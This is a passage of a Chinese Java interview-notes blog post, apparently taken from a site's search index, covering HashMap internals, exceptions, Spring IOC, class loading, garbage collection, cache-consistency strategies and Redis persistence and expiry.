扩容以后,1.7对元素进行rehash算法,计算原来每个元素在扩容之后的哈希表中的位置,1.8借助2倍扩容机制,元素不需要进行重新计算位置 JDK 1.8 在扩容时并没有像 JDK 1.7 那样，重新计算每个元素的哈希值，而是通过高位运算**（e.hash \u0026 oldCap）**来确定元素是否需要移动，比如 key1 的信息如下： 使用 e.hash \u0026 oldCap 得到的结果，高一位为 0，当结果为 0 时表示元素在扩容时位置不会发生任何变化，而 key 2 信息如下 高一位为 1，当结果为 1 时，表示元素在扩容时位置发生了变化，新的下标位置等于原下标位置 + 原数组长度**hashmap,**不必像1.7一样全部重新计算位置 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:4:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"为什么hashmap扩容的时候是两倍？ 查看源代码 在存入元素时,放入元素位置有一个 (n-1)\u0026hash 的一个算法,和hash\u0026(newCap-1),这里用到了一个\u0026位运算符 当HashMap的容量是16时，它的二进制是10000，(n-1)的二进制是01111，与hash值得计算结果如下 下面就来看一下HashMap的容量不是2的n次幂的情况，当容量为10时，二进制为01010，(n-1)的二进制是01001，向里面添加同样的元素，结果为 可以看出，有三个不同的元素进过\u0026运算得出了同样的结果，严重的hash碰撞了 只有当n的值是2的N次幂的时候，进行\u0026位运算的时候，才可以只看后几位，而不需要全部进行计算 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:5:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"hashmap线程安全的方式？ HashMap不是线程安全的,往往在写程序时需要通过一些方法来回避.其实JDK原生的提供了2种方法让HashMap支持线程安全. 方法一:通过Collections.synchronizedMap()返回一个新的Map,这个新的map就是线程安全的. 这个要求大家习惯基于接口编程,因为返回的并不是HashMap,而是一个Map的实现. 方法二:重新改写了HashMap,具体的可以查看java.util.concurrent.ConcurrentHashMap. 这个方法比方法一有了很大的改进. 方法一特点: 通过Collections.synchronizedMap()来封装所有不安全的HashMap的方法,就连toString, hashCode都进行了封装. 封装的关键点有2处,1)使用了经典的synchronized来进行互斥, 2)使用了代理模式new了一个新的类,这个类同样实现了Map接口.在Hashmap上面,synchronized锁住的是对象,所以第一个申请的得到锁,其他线程将进入阻塞,等待唤醒. 优点:代码实现十分简单,一看就懂.缺点:从锁的角度来看,方法一直接使用了锁住方法,基本上是锁住了尽可能大的代码块.性能会比较差. 方法二特点: 重新写了HashMap,比较大的改变有如下几点.使用了新的锁机制,把HashMap进行了拆分,拆分成了多个独立的块,这样在高并发的情况下减少了锁冲突的可能,使用的是NonfairSync. 这个特性调用CAS指令来确保原子性与互斥性.当如果多个线程恰好操作到同一个segment上面,那么只会有一个线程得到运行. 优点:需要互斥的代码段比较少,性能会比较好. ConcurrentHashMap把整个Map切分成了多个块,发生锁碰撞的几率大大降低,性能会比较好. 缺点:代码繁琐 Java异常处理方式 Java 通过面向对象的方法进行异常处理，一旦方法抛出异常，系统自动根据该异常对象寻找合适异常处理器（Exception Handler）来处理该异常，把各种不同的异常进行分类，并提供了良好的接口。在 Java 中，每个异常都是一个对 象，它是 Throwable 类或其子类的实例。当一个方法出现异常后便抛出一个异常对象，该对象中包含有异常信息，调用这个对象的方法可以捕获到这个异常并可以对其进行处理。Java 的异常处理是通过 5 个关键词来实现的：try、 catch、throw、throws 和 finally。 在Java应用中，异常的处理机制分为声明异常，抛出异常和捕获异常。 throw和throws的区别： （1）位置不同： throw：方法内部 throws: 方法的签名处，方法的声明处 （2）内容不同： throw+异常对象（检查异常，运行时异常） throws+异常的类型（可以多个类型，用，拼接） （3）作用不同： throw：异常出现的源头，制造异常。 throws:在方法的声明处，告诉方法的调用者，这个方法中可能会出现我声明的这些异常。然后调用者对这个异常进行处理： 要么自己处理要么再继续向外抛出异常 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:6:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"1.throws声明异常 通常，应该捕获那些知道如何处理的异常，将不知道如何处理的异常继续传递下 去。传递异常可以在方法签名处使用 throws 关键字声明可能会抛出的异常。注意 非检查异常（Error、RuntimeException 或它们的子类）不可使用 throws 关键字来声明要抛出的异常。 ​ 一个方法出现编译时异常，就需要 try-catch/ throws 处理，否则会导致编译错误 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:7:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"2.throw抛出异常 如果你觉得解决不了某些异常问题，且不需要调用者处理，那么你可以抛出异常。 throw关键字作用是在方法内部抛出一个Throwable类型的异常。任何Java代码都可以通过throw语句抛出异常。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:8:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"3.trycatch捕获异常 程序通常在运行之前不报错，但是运行后可能会出现某些未知的错误，但是还不想直接抛出到上一级，那么就需要通过try…catch…的形式进行异常捕获，之后根据不同的异常情况来进行相应的处理。如何选择异常类型 可以根据下图来选择是捕获异常，声明异常还是抛出异常 自定义异常在生产中如何应用 Java虽然提供了丰富的异常处理类，但是在项目中还会经常使用自定义异常，其主要原因是Java提供的异常类在某些情况下还是不能满足实际需球。例如以下情况： 1、系统中有些错误是符合Java语法，但不符合业务逻辑。 2、在分层的软件结构中，通常是在表现层统一对系统其他层次的异常进行捕获处理。 如何实现一个IOC容器? ​ IOC(Inversion of Control),意思是控制反转，不是什么技术，而是一种设计思想，IOC意味着将你设计好的对象交给容器控制，而不是传统的在你的对象内部直接控制。 ​ 在传统的程序设计中，我们直接在对象内部通过new进行对象创建，是程序主动去创建依赖对象，而IOC是有专门的容器来进行对象的创建，即IOC容器来控制对象的创建。 ​ 在传统的应用程序中，我们是在对象中主动控制去直接获取依赖对象，这个是正转，反转是由容器来帮忙创建及注入依赖对象，在这个过程过程中，由容器帮我们查找级注入依赖对象，对象只是被动的接受依赖对象。 ​ 1、先准备一个基本的容器对象，包含一些map结构的集合，用来方便后续过程中存储具体的对象 ​ 2、进行配置文件的读取工作或者注解的解析工作，将需要创建的bean对象都封装成BeanDefinition对象存储在容器中 ​ 3、容器将封装好的BeanDefinition对象通过反射的方式进行实例化，完成对象的实例化工作 ​ 4、进行对象的初始化操作，也就是给类中的对应属性值就行设置，也就是进行依赖注入，完成整个对象的创建，变成一个完整的bean对象，存储在容器的某个map结构中 ​ 5、通过容器对象来获取对象，进行对象的获取和逻辑处理工作 ​ 6、提供销毁操作，当对象不用或者容器关闭的时候，将无用的对象进行销毁 说说你对Spring 的理解？ 官网地址：https://spring.io/projects/spring-framework#overview 压缩包下载地址：https://repo.spring.io/release/org/springframework/spring/ 源码地址：https://github.com/spring-projects/spring-framework Spring makes it easy to create Java enterprise applications. It provides everything you need to embrace the Java language in an enterprise environment, with support for Groovy and Kotlin as alternative languages on the JVM, and with the flexibility to create many kinds of architectures depending on an application’s needs. As of Spring Framework 5.1, Spring requires JDK 8+ (Java SE 8+) and provides out-of-the-box support for JDK 11 LTS. Java SE 8 update 60 is suggested as the minimum patch release for Java 8, but it is generally recommended to use a recent patch release. Spring supports a wide range of application scenarios. In a large enterprise, applications often exist for a long time and have to run on a JDK and application server whose upgrade cycle is beyond developer control. Others may run as a single jar with the server embedded, possibly in a cloud environment. Yet others may be stan","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:9:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":" 双亲委派机制 双亲委派模式是在Java 1.2后引入的，其工作原理的是，如果一个类加载器收到了类加载请求，它并不会自己先去加载，而是把这个请求委托给父类的加载器去执行，如果父类加载器还存在其父类加载器，则进一步向上委托，依次递归，请求最终将到达顶层的启动类加载器，如果父类加载器可以完成类加载任务，就成功返回，倘若父类加载器无法完成此加载任务，子加载器才会尝试自己去加载，这就是双亲委派模式。 双亲委派的好处 每一个类都只会被加载一次，避免了重复加载 每一个类都会被尽可能的加载（从引导类加载器往下，每个加载器都可能会根据优先次序尝试加载它） 有效避免了某些恶意类的加载（比如自定义了Java.lang.Object类，一般而言在双亲委派模型下会加载系统的Object类而不是自定义的Object类） 另外，可以多讲一下，如何破坏双亲委派模型 双亲委派模型的第一次“被破坏”是重写自定义加载器的loadClass(),jdk不推荐。一般都只是重写findClass()，这样可以保持双亲委派机制.而loadClass方法加载规则由自己定义，就可以随心所欲的加载类 双亲委派模型的第二次“被破坏”是ServiceLoader和Thread.setContextClassLoader()。即线程上下文类加载器（contextClassLoader）。双亲委派模型很好地解决了各个类加载器的基础类统一问题(越基础的类由越上层的加载器进行加载)，基础类之所以被称为“基础”，是因为它们总是作为被调用代码调用的API。但是，如果基础类又要调用用户的代码，那该怎么办呢？线程上下文类加载器就出现了。 SPI。这个类加载器可以通过java.lang.Thread类的setContextClassLoader()方法进行设置，如果创建线程时还未设置，它将会从父线程中继承一个；如果在应用程序的全局范围内都没有设置过，那么这个类加载器默认就是应用程序类加载器。了有线程上下文类加载器，JNDI服务使用这个线程上下文类加载器去加载所需要的SPI代码，也就是父类加载器请求子类加载器去完成类加载动作，这种行为实际上就是打通了双亲委派模型的层次结构来逆向使用类加载器，已经违背了双亲委派模型，但这也是无可奈何的事情。Java中所有涉及SPI的加载动作基本上都采用这种方式，例如JNDI,JDBC,JCE,JAXB和JBI等。 线程上下文类加载器默认情况下就是AppClassLoader，那为什么不直接通过getSystemClassLoader()获取类加载器来加载classpath路径下的类的呢？其实是可行的，但这种直接使用getSystemClassLoader()方法获取AppClassLoader加载类有一个缺点，那就是代码部署到不同服务时会出现问题，如把代码部署到Java Web应用服务或者EJB之类的服务将会出问题，因为这些服务使用的线程上下文类加载器并非AppClassLoader，而是Java Web应用服自家的类加载器，类加载器不同。，所以我们应用该少用getSystemClassLoader()。总之不同的服务使用的可能默认ClassLoader是不同的，但使用线程上下文类加载器总能获取到与当前程序执行相同的ClassLoader，从而避免不必要的问题 双亲委派模型的第三次“被破坏”是由于用户对程序动态性的追求导致的，这里所说的“动态性”指的是当前一些非常“热门”的名词：代码热替换、模块热部署等，简答的说就是机器不用重启，只要部署上就能用。 GC如何判断对象可以被回收？ 引用计数法（已被淘汰的算法） 每一个对象有一个引用属性，新增一个引用时加一，引用释放时减一，计数为0的时候可以回收。 但是这种计算方法，有一个致命的问题，无法解决循环引用的问题 可达性分析算法（根引用） 从GcRoot开始向下搜索，搜索所走过的路径被称为引用链，当一个对象到GcRoot没有任何引用链相连时，则证明此对象是不可用的，那么虚拟机就可以判定回收。 那么GcRoot有哪些？ 虚拟机栈中引用的对象 方法区中静态属性引用的对象。 方法区中常量引用的对象 本地方法栈中（即一般说的native方法）引用的对象 此外，不同的引用类型的回收机制是不一样的 强引用：通过关键字new的对象就是强引用对象，强引用指向的对象任何时候都不会被回收，宁愿OOM也不会回收。 软引用：如果一个对象持有软引用，那么当JVM堆空间不足时，会被回收。一个类的软引用可以通过java.lang.ref.SoftReference持有。 弱引用：如果一个对象持有弱引用，那么在GC时，只要发现弱引用对象，就会被回收。一个类的弱引用可以通过java.lang.ref.WeakReference持有。 虚引用：几乎和没有一样，随时","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:10:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"大前提： 先读缓存，如果缓存没有，才从数据库读取。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:10:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"(1)先更新数据库，再更新缓存 这套方案，大家是普遍反对的。为什么呢？有如下两点原因。 原因一（线程安全角度） 同时有请求A和请求B进行更新操作，那么会出现 （1）线程A更新了数据库 （2）线程B更新了数据库 （3）线程B更新了缓存 （4）线程A更新了缓存 这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。 原因二（业务场景角度） 有如下两点： （1）如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。 （2）如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。 接下来讨论的就是争议最大的，先删缓存，再更新数据库。还是先更新数据库，再删缓存的问题。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:10:2","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"(2)先删缓存，再更新数据库 该方案会导致不一致的原因是。同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形: （1）请求A进行写操作，删除缓存 （2）请求B查询发现缓存不存在 （3）请求B去数据库查询得到旧值 （4）请求B将旧值写入缓存 （5）请求A将新值写入数据库 上述情况就会导致不一致的情形出现。而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。 那么，如何解决呢？采用延时双删策略 （1）先淘汰缓存 （2）再写数据库（这两步和原来一样） （3）休眠1秒，再次淘汰缓存 这么做，可以将1秒内所造成的缓存脏数据，再次删除。 那么，这个1秒怎么确定的，具体该休眠多久呢？ 针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。 如果你用了mysql的读写分离架构怎么办？ ok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。 （1）请求A进行写操作，删除缓存 （2）请求A将数据写入数据库了， （3）请求B查询缓存发现，缓存没有值 （4）请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值 （5）请求B将旧值写入缓存 （6）数据库完成主从同步，从库变为新值 上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。 采用这种同步淘汰策略，吞吐量降低怎么办？ ok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。 第二次删除,如果删除失败怎么办？ 这是个非常好的问题，因为第二次删除失败，就会出现如下情形。还是有两个请求，一个请求A进行更新操作，另一个请求B进行查询操作，为了方便，假设是单库： （1）请求A进行写操作，删除缓存 （2）请求B查询发现缓存不存在 （3）请求B去数据库查询得到旧值 （4）请求B将旧值写入缓存 （5）请求A将新值写入数据库 （6）请求A试图去删除，请求B写入对的缓存值，结果失败了。 ok,这也就是说。如果第二次删除缓存失败，会再次出现缓存和数据库不一致的问题。 如何解决呢？ ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:10:3","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"(3)先更新数据库，再删缓存 首先，先说一下。老外提出了一个缓存更新套路，名为《Cache-Aside pattern》。其中就指出 失效：应用程序先从cache取数据，没有得到，则从数据库中取数据，成功后，放到缓存中。 命中：应用程序从cache中取数据，取到后返回。 更新：先把数据存到数据库中，成功后，再让缓存失效。 另外，知名社交网站facebook也在论文《Scaling Memcache at Facebook》中提出，他们用的也是先更新数据库，再删缓存的策略。 这种情况不存在并发问题么？ 不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生 （1）缓存刚好失效 （2）请求A查询数据库，得一个旧值 （3）请求B将新值写入数据库 （4）请求B删除缓存 （5）请求A将查到的旧值写入缓存 ok，如果发生上述情况，确实是会发生脏数据。 然而，发生这种情况的概率又有多少呢？ 发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。 假设，有人非要抬杠，有强迫症，一定要解决怎么办？ 如何解决上述并发问题？ 首先，给缓存设有效时间是一种方案。其次，采用策略（2）里给出的异步延时删除策略，保证读请求完成以后，再进行删除操作。 还有其他造成不一致的原因么？ 有的，这也是缓存更新策略（2）和缓存更新策略（3）都存在的一个问题，如果删缓存失败了怎么办，那不是会有不一致的情况出现么。比如一个写数据请求，然后写入数据库了，删缓存失败了，这会就出现不一致的情况了。这也是缓存更新策略（2）里留下的最后一个疑问。 如何解决？ 提供一个保障的重试机制即可，这里给出两套方案。 方案一： 如下图所示 流程如下所示 （1）更新数据库数据； （2）缓存因为种种问题删除失败 （3）将需要删除的key发送至消息队列 （4）自己消费消息，获得需要删除的key （5）继续重试删除操作，直到成功 然而，该方案有一个缺点，对业务线代码造成大量的侵入。于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作。 方案二： 流程如下图所示： （1）更新数据库数据 （2）数据库会将操作信息写入binlog日志当中 （3）订阅程序提取出所需要的数据以及key （4）另起一段非业务代码，获得该信息 （5）尝试删除缓存操作，发现删除失败 （6）将这些信息发送至消息队列 （7）重新从消息队列中获得该数据，重试操作。 **备注说明：**上述的订阅binlog程序在mysql中有现成的中间件叫canal，可以完成订阅binlog日志的功能。至于oracle中，博主目前不知道有没有现成中间件可以使用。另外，重试机制，博主是采用的是消息队列的方式。如果对一致性要求不是很高，直接在程序中另起一个线程，每隔一段时间去重试即可，这些大家可以灵活自由发挥，只是提供一个思路。 分布式微服务项目你是如何设计的？ 我一般设计成两层：业务层和能力层（中台），业务层接受用户请求，然后通过调用能力层来完成业务逻辑。 认证 (Authentication) 和授权 (Authorization)的区别是什么？ Authentication（认证） 是验证您的身份的凭据（例如用户名/用户ID和密码），通过这个凭据，系统得以知道你就是你，也就是说系统存在你这个用户。所以，Authentication 被称为身份/用户验证。 Authorization（授权） 发生在 Authentication（认证） 之后。授权，它主要掌管我们访问系统的权限。比如有些特定资源只能具有特定权限的人才能访问比如admin，有些对系统资源操作比如删除、添加、更新只能特定人才具有。 这两个一般在我们的系统中被结合在一起使用，目的就是为了保护我们系统的安全性。 Cookie 和 Session 有什么区别？如何使用Session进行身份验证？ Session 的主要作用就是通过服务端记录用户的状态。 典型的场景是购物车，当你要添加商品到购物车的时候，系统不知道是哪个用户操作的，因为 HTTP 协议是无状态的。服务端给特定的用户创建特定的 Session 之后就可以标识这个用户并且跟踪这个用户了。 Cookie 数据保存在客户端(浏览器端)，Session 数据保存在服务器端。相对来说 Session 安全性更高。如果使用 Cookie 的一些敏感信息","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:10:4","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Redis 持久化 Redis 提供了不同级别的持久化方式: RDB持久化方式能够在指定的时间间隔能对你的数据进行快照存储. AOF持久化方式记录每次对服务器写的操作,当服务器重启的时候会重新执行这些命令来恢复原始的数据,AOF命令以redis协议追加保存每次写的操作到文件末尾.Redis还能对AOF文件进行后台重写,使得AOF文件的体积不至于过大. 如果你只希望你的数据在服务器运行的时候存在,你也可以不使用任何持久化方式. 你也可以同时开启两种持久化方式, 在这种情况下, 当redis重启的时候会优先载入AOF文件来恢复原始的数据,因为在通常情况下AOF文件保存的数据集要比RDB文件保存的数据集要完整. 最重要的事情是了解RDB和AOF持久化方式的不同,让我们以RDB持久化方式开始: ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:11:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"RDB的优点 RDB是一个非常紧凑的文件,它保存了某个时间点得数据集,非常适用于数据集的备份,比如你可以在每个小时报保存一下过去24小时内的数据,同时每天保存过去30天的数据,这样即使出了问题你也可以根据需求恢复到不同版本的数据集. RDB是一个紧凑的单一文件,很方便传送到另一个远端数据中心或者亚马逊的S3（可能加密），非常适用于灾难恢复. RDB在保存RDB文件时父进程唯一需要做的就是fork出一个子进程,接下来的工作全部由子进程来做，父进程不需要再做其他IO操作，所以RDB持久化方式可以最大化redis的性能. 与AOF相比,在恢复大的数据集的时候，RDB方式会更快一些. ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:12:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"RDB的缺点 如果你希望在redis意外停止工作（例如电源中断）的情况下丢失的数据最少的话，那么RDB不适合你.虽然你可以配置不同的save时间点(例如每隔5分钟并且对数据集有100个写的操作),是Redis要完整的保存整个数据集是一个比较繁重的工作,你通常会每隔5分钟或者更久做一次完整的保存,万一在Redis意外宕机,你可能会丢失几分钟的数据. RDB 需要经常fork子进程来保存数据集到硬盘上,当数据集比较大的时候,fork的过程是非常耗时的,可能会导致Redis在一些毫秒级内不能响应客户端的请求.如果数据集巨大并且CPU性能不是很好的情况下,这种情况会持续1秒,AOF也需要fork,但是你可以调节重写日志文件的频率来提高数据集的耐久度. ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:13:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"AOF 优点 使用AOF 会让你的Redis更加耐久: 你可以使用不同的fsync策略：无fsync,每秒fsync,每次写的时候fsync.使用默认的每秒fsync策略,Redis的性能依然很好(fsync是由后台线程进行处理的,主线程会尽力处理客户端请求),一旦出现故障，你最多丢失1秒的数据. AOF文件是一个只进行追加的日志文件,所以不需要写入seek,即使由于某些原因(磁盘空间已满，写的过程中宕机等等)未执行完整的写入命令,你也也可使用redis-check-aof工具修复这些问题. Redis 可以在 AOF 文件体积变得过大时，自动地在后台对 AOF 进行重写： 重写后的新 AOF 文件包含了恢复当前数据集所需的最小命令集合。 整个重写操作是绝对安全的，因为 Redis 在创建新 AOF 文件的过程中，会继续将命令追加到现有的 AOF 文件里面，即使重写过程中发生停机，现有的 AOF 文件也不会丢失。 而一旦新 AOF 文件创建完毕，Redis 就会从旧 AOF 文件切换到新 AOF 文件，并开始对新 AOF 文件进行追加操作。 AOF 文件有序地保存了对数据库执行的所有写入操作， 这些写入操作以 Redis 协议的格式保存， 因此 AOF 文件的内容非常容易被人读懂， 对文件进行分析（parse）也很轻松。 导出（export） AOF 文件也非常简单： 举个例子， 如果你不小心执行了 FLUSHALL 命令， 但只要 AOF 文件未被重写， 那么只要停止服务器， 移除 AOF 文件末尾的 FLUSHALL 命令， 并重启 Redis ， 就可以将数据集恢复到 FLUSHALL 执行之前的状态。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:14:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"AOF 缺点 对于相同的数据集来说，AOF 文件的体积通常要大于 RDB 文件的体积。 根据所使用的 fsync 策略，AOF 的速度可能会慢于 RDB 。 在一般情况下， 每秒 fsync 的性能依然非常高， 而关闭 fsync 可以让 AOF 的速度和 RDB 一样快， 即使在高负荷之下也是如此。 不过在处理巨大的写入载入时，RDB 可以提供更有保证的最大延迟时间（latency）。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:15:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"4.X版本的整合策略 在AOF重写策略上做了优化 在重写AOF文件时，4.x版本以前是把内存数据集的操作指令落地，而新版本是把内存的数据集以rdb的形式落地 这样重写后的AOF依然追加的是日志，但是，在恢复的时候是先rdb再增量的日志，性能更优秀 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:16:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"扩展知识 异步线程知识点 计算机组成原理 fork copy on write 系统IO pagecache fsync redis的过期键有哪些删除策略 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:17:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"过期精度 在 Redis 2.4 及以前版本，过期期时间可能不是十分准确，有0-1秒的误差。 从 Redis 2.6 起，过期时间误差缩小到0-1毫秒。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:18:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"过期和持久 Keys的过期时间使用Unix时间戳存储(从Redis 2.6开始以毫秒为单位)。这意味着即使Redis实例不可用，时间也是一直在流逝的。 要想过期的工作处理好，计算机必须采用稳定的时间。 如果你将RDB文件在两台时钟不同步的电脑间同步，有趣的事会发生（所有的 keys装载时就会过期）。 即使正在运行的实例也会检查计算机的时钟，例如如果你设置了一个key的有效期是1000秒，然后设置你的计算机时间为未来2000秒，这时key会立即失效，而不是等1000秒之后。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:19:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"Redis如何淘汰过期的keys Redis keys过期有两种方式：被动和主动方式。 当一些客户端尝试访问它时，key会被发现并主动的过期。 当然，这样是不够的，因为有些过期的keys，永远不会访问他们。 无论如何，这些keys应该过期，所以定时随机测试设置keys的过期时间。所有这些过期的keys将会从密钥空间删除。 具体就是Redis每秒10次做的事情： 测试随机的20个keys进行相关过期检测。 删除所有已经过期的keys。 如果有多于25%的keys过期，重复步奏1. 这是一个平凡的概率算法，基本上的假设是，我们的样本是这个密钥控件，并且我们不断重复过期检测，直到过期的keys的百分百低于25%,这意味着，在任何给定的时刻，最多会清除1/4的过期keys。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:20:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"在复制AOF文件时如何处理过期 为了获得正确的行为而不牺牲一致性，当一个key过期，DEL将会随着AOF文字一起合成到所有附加的slaves。在master实例中，这种方法是集中的，并且不存在一致性错误的机会。 然而，当slaves连接到master时，不会独立过期keys（会等到master执行DEL命令），他们任然会在数据集里面存在，所以当slave当选为master时淘汰keys会独立执行，然后成为master。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:21:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"﻿扩展 绝对时间点过期 相对时间点过期 时钟轮算法 redis线程模型有哪些，单线程为什么快 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:22:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"IO模型维度的特征 IO模型使用了多路复用器，在linux系统中使用的是EPOLL 类似netty的BOSS,WORKER使用一个EventLoopGroup(threads=1) 单线程的Reactor模型，每次循环取socket中的命令然后逐一操作，可以保证socket中的指令是按顺序的，不保证不同的socket也就是客户端的命令的顺序性 命令操作在单线程中顺序操作，没有多线程的困扰不需要锁的复杂度，在操作数据上相对来说是原子性质的 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:23:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"架构设计模型 自身的内存存储数据，读写操作不设计磁盘IO redis除了提供了Value具备类型还为每种类型实现了一些操作命令 实现了计算向数据移动，而非数据想计算移动，这样在IO的成本上有一定的优势 且在数据结构类型上，丰富了一些统计类属性，读写操作中，写操作会O(1)负载度更新length类属性，使得读操作也是O(1)的 缓存雪崩、缓存穿透、缓存击穿在实际中如何处理 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:24:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"缓存穿透 缓存穿透是指查询一个一定不存在的数据，由于缓存是不命中时被动写的，并且出于容错考虑，如果从存储层查不到数据则不写入缓存，这将导致这个不存在的数据每次请求都要到存储层去查询，失去了缓存的意义。在流量大时，可能DB就挂掉了，要是有人利用不存在的key频繁攻击我们的应用，这就是漏洞。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:25:0","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"解决方案 有很多种方法可以有效地解决缓存穿透问题，最常见的则是采用布隆过滤器，将所有可能存在的数据哈希到一个足够大的bitmap中，一个一定不存在的数据会被 这个bitmap拦截掉，从而避免了对底层存储系统的查询压力。另外也有一个更为简单粗暴的方法（我们采用的就是这种），如果一个查询返回的数据为空（不管是数 据不存在，还是系统故障），我们仍然把这个空结果进行缓存，但它的过期时间会很短，最长不超过五分钟。 ","date":"2023-02-12","objectID":"/posts/java%E9%9D%A2%E8%AF%95/:25:1","tags":[],"title":"Java面试","uri":"/posts/java%E9%9D%A2%E8%AF%95/"},{"categories":["java面试"],"content":"缓存击穿 